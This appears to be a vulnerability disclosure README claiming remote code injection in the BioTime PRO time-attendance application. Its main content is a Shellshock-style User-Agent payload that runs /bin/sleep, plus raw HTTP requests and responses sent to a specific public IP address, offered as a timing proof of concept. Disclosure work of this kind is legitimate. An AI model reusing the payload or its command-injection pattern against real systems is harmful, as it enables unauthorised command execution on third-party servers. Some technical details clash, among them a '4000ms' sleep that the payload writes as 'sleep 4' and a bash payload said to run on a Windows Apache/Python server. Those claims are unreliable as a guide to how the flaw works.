# BioTime-RCI

A critical code injection vulnerability has been identified in the BioTime PRO application. This vulnerability arises from the application evaluating user input as executable code, which allows an attacker to manipulate the system's behavior. The issue was demonstrated by injecting a crafted payload into the "User-Agent" header, specifically () { _; } >_[$$($$())] { /bin/sleep 0; }. This payload instructed the server to execute the sleep command, which causes the server to pause for a specified duration before responding.

In the initial test, when the payload was set to sleep for 0 milliseconds, the server responded after 556ms. However, when the payload was altered to instruct the server to sleep for 4000ms, the response time increased to 4525ms, confirming that the injected code was executed by the server. This behavior demonstrates the vulnerability, as the server is incorrectly processing user input as executable code.

# <strong>Request #1 (0ms)</strong></br>
GET /login/?next=/ HTTP/1.1</br>
Host: 187.202.248.194:8808</br>
Accept-Encoding: gzip, deflate, br</br>
Accept: */*</br>
Accept-Language: en-US;q=0.9,en;q=0.8</br>
User-Agent: () { _; } >_[$$($$())] { /bin/sleep 0; }</br>
Connection: close</br>
Cache-Control: max-age=0</br>
Referer: http://187.202.248.194:8808/</br>

# <strong>Response #1 (0ms)</strong></br>
HTTP/1.1 200 OK</br>
Date: Mon, 20 Jan 2025 02:53:20 GMT</br>
Server: Apache/2.4.29 (Win64) mod_wsgi/4.5.24 Python/2.7</br>
Content-Length: 8464</br>
Content-Language: es-mx</br>
Expires: Mon, 20 Jan 2025 02:53:20 GMT</br>
Vary: Cookie,Accept-Language</br>
Pragma: no-cache</br>
Cache-Control: no-store</br>
Content-Type: text/html; charset=utf-8</br>
Set-Cookie: csrftoken=uFz7eNnGN00aAJOtLecW6NiasFhfBc8t27dVRCtxfxHF88ehK5inLwPrJPrWhvz0; expires=Mon, 19-Jan-2026 02:53:20 GMT; Max-Age=31449600; Path=/</br>
Connection: close</br>

# <strong>Request #2 (4000ms)</strong></br>
GET /login/?next=/ HTTP/1.1</br>
Host: 187.202.248.194:8808</br>
Accept-Encoding: gzip, deflate, br</br>
Accept: */*</br>
Accept-Language: en-US;q=0.9,en;q=0.8</br>
User-Agent: () { _; } >_[$$($$())] { /bin/sleep 4; }</br>
Connection: close</br>
Cache-Control: max-age=0</br>
Referer: http://187.202.248.194:8808/</br>

# <strong>Response #2 (4000ms)</strong></br>
HTTP/1.1 200 OK</br>
Date: Mon, 20 Jan 2025 02:53:21 GMT</br>
Server: Apache/2.4.29 (Win64) mod_wsgi/4.5.24 Python/2.7</br>
Content-Length: 8464</br>
Content-Language: es-mx</br>
Expires: Mon, 20 Jan 2025 02:53:28 GMT</br>
Vary: Cookie,Accept-Language</br>
Pragma: no-cache</br>
Cache-Control: no-store</br>
Content-Type: text/html; charset=utf-8</br>
Set-Cookie: csrftoken=CtdDPNnK4cXtsYml2Os22fhU3SpEVLeak2O3PpKxeqnXS0RLbxf3NhTjugjWg5rp; expires=Mon, 19-Jan-2026 02:53:28 GMT; Max-Age=31449600; Path=/</br>
Connection: close</br>
